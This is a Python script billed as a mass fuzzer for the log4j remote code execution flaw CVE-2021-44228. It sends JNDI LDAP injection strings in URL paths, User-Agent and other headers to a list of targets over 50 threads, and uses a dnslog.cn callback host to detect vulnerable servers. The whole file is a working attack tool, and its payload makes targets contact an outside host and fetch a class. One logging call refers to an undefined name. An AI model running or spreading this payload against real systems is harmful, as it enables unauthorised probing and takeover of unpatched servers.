#! /usr/bin/env python3
# ******************************************************************
# log4j: A generic fuzzer for Apache log4j RCE CVE-2021-44228
# Author:
# twitter: https://twitter.com/alenazi_90
#  Usage:
#   1- generate dnslog.cn
#   2- python3 log4j.py -l urls.txt --dns-log REPLACE_THIS.dnslog.cn
#   3- check dnslog.cn logs
# ******************************************************************

import logging
import requests
import socket
import argparse
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

url_list = []
header_list = []
count=0
def log4j(url,header, dnslog):
  url = f'{url}/x=${{jndi:ldap://{dnslog}/exploit.class}}'
  try:
    requests.get(
          url,
          headers={header     : f'${{jndi:ldap://{dnslog}/exploit.class}}', 
                  'User-Agent': f'${{jndi:ldap://{dnslog}/exploit.class}}' 
                    },
            verify=False
    )
  except requests.exceptions.ConnectionError as e:
    log.error(f"HTTP connection to target URL error: {e}")
  except requests.exceptions.RequestException as e:
    return e

def runner(url_list, header_list, dnslog):
    threads= []
    with ThreadPoolExecutor(max_workers=50) as executor:
        for url in url_list:
            for header in header_list:
                threads.append(executor.submit(log4j, url, header, dnslog))
        #for task in as_completed(threads):
            #print("result")
            #print(task.result())

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-l', type=str, dest='urls', help="URLs ")
    parser.add_argument('--dns-log', type=str, dest='dnslog', help='generate DNS log from dnslog.cn ')
    parser.add_argument('--headers', type=str, dest='header_list', default='headers.txt', help='header.txt')

    args = parser.parse_args()
    for url in open(args.urls):
      url_list.append(url.strip())
    for header in open(args.header_list):
      header_list.append(header.strip())

    runner(url_list, header_list, args.dnslog)
    print("done")


if __name__ == "__main__":
    main()






